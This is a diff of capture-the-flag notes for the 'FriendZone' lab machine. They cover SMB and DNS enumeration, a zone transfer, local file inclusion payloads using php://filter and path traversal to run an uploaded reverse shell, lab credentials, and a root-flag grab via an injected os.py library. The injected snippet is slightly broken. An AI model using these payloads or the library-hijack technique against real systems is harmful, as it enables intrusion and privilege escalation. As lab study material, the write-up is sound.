@@ -1,17 +1,19 @@
+# FRIENDZONE
+
 10.10.10.123
 
-# gobuster
+# USER
 
+gobuster
+```
 	/wordpress
-				<NONE>
-
 	/images
 	/upload
 	/timestamp
+```
 
-
-# SMB enumeration
-
+SMB enumeration
+```
 	Sharename       Type      Comment
 	---------       ----      -------
 	print$          Disk      Printer Drivers
@@ -72,33 +74,46 @@ Host script results:
 |     Path: C:\var\lib\samba\printers
 |     Anonymous access: <none>
 |_    Current user access: <none>
+```
 
-# Gets to user directory
+Command below gets to user directory
+```
 smbclient \\\\10.10.10.123\\general\\
+```
 
-# Gives us the listing of a file containing
->> creds for the admin THING:
->>>
->>> admin:WORKWORKHhallelujah@#
+Gives us the listing of a file containing
+```
+creds for the admin THING:
 
+admin:WORKWORKHhallelujah@#
+```
 
-# Querying the DNS server gives us:
+Querying the DNS server gives us:
 
+```
 PORT   STATE SERVICE
 53/udp open  domain
 | dns-cache-snoop: 1 of 1 tested domains are cached.
 |_friendzone.red
+```
 
+Using dnsrecon provides us with more information
 https://github.com/darkoperator/dnsrecon.git
 
+```
 [*] Performing host and subdomain brute force against friendzone.red
 [*] 	 A hr.friendzone.red 127.0.0.1
 [*] 	 A uploads.friendzone.red 127.0.0.1
+```
 
-# Using dig to query zone transfers
+Using dig to query zone transfers
 
->>> dig axfr friendzone.red @10.10.10.123
+```
+dig axfr friendzone.red @10.10.10.123
+```
 
+Outputs:
+```
  axfr friendzone.red @10.10.10.123
 	;; global options: +cmd
 	friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
@@ -130,64 +145,91 @@ https://github.com/darkoperator/dnsrecon.git
 	;; SERVER: 10.10.10.123#53(10.10.10.123)
 	;; WHEN: Thu Mar 07 16:37:37 UTC 2019
 	;; XFR size: 9 records (messages 1, bytes 309)
+```
 
-# By adding 10.10.10.123 to hosts file with administrator1.friendzone.red it allows us to virutal host resolve
-# us to an admin page
+By adding 10.10.10.123 to hosts file with administrator1.friendzone.red it allows us to virutal host resolve
+us to an admin page
 
->>> https://administrator1.friendzone.red
->>> https://uploads.friendzone.red
+```
+https://administrator1.friendzone.red
+https://uploads.friendzone.red
+```
 
+Virutal host routing allows us to use the value below as the host parameter for the https server to give us a secret login box
 
-# Virutal host routing allows us to use the value below as the host parremeter for the https server to give us a secret login box
+```
+3
+```
 
->>> 3
-
-# It logs us into a basic site with some sort of params that run command?
-
->>> timestamp
-
-# Localfile inclusion allows the reading of php files
-	?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=timestamp
-	?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=https://uploads.friendzone.red/upload.php
-
-# ================================================================== #
-# Way to read php code of websitess
->>> pagename=php://filter/read=convert.base64-encode/resource=X
-# ================================================================== #
+It logs us into a basic site with some sort of params that run command?
 
 
-# Uploading a reverse shell to the SMB share allows us to execute by runing:
+Localfile inclusion allows the reading of php files
+```
+?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=timestamp
+?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=https://uploads.friendzone.re
+upload.php
+```
+
+Way to read php code of websitess
+```
+pagename=php://filter/read=convert.base64-encode/resource=X
+```
+
+Uploading a reverse shell to the SMB share allows us to execute by runing:
+```
 https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../../../../../etc/Development/shell
+```
 
-# This provides us with a shell. Now onto priv-esc
+This provides us with a shell and the user.txt.
 
-# Creds found in a sql_data.conf
+# ROOT
 
->>> friend
->>> Agpyu12!0.213$
+Creds found in a sql_data.conf
 
-# Found this command in a python file in the /opt/ directory??
+```
+friend
+Agpyu12!0.213$
+```
 
-	#!/usr/bin/python
+Found this python file in the /opt/ directory??
 
-	import os
+```python
+#!/usr/bin/python
 
-	to_address = "admin1@friendzone.com"
-	from_address = "admin2@friendzone.com"
+import os
 
-	print "[+] Trying to send email to %s"%to_address
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
 
-	#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+print "[+] Trying to send email to %s"%to_address
 
-	#os.system(command)
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
 
-	# I need to edit the script later
-	# Sam ~ python developer
+#os.system(command)
 
-# Can edit python library
->>> /usr/lib/python2.7/os.py
+# I need to edit the script later
+# Sam ~ python developer
+```
 
-# Script found imports this library. Will get it to copy the value of the root flag to 
-# the temp directory
+From further enum it can be seen that we can edit this python library
+```
+/usr/lib/python2.7/os.py
+```
 
-# Code can be found in exploit.py
+This is imported in the previous script. Therefore, anything places is ```os.py``` will be executed by the script
+
+Exploit added:
+```python
+# <HACK>
+flag = "" 
+with open("/root/root.txt", "r") as file:
+        data = file.read() 
+        
+with open("/tmp/" + flag, "w+") as file:
+        file.write("hello") 
+# </HACK>
+```
+
+This copies the root file and gives us it in the temp. This could be expanded for root shell by running a 
+reverse shell
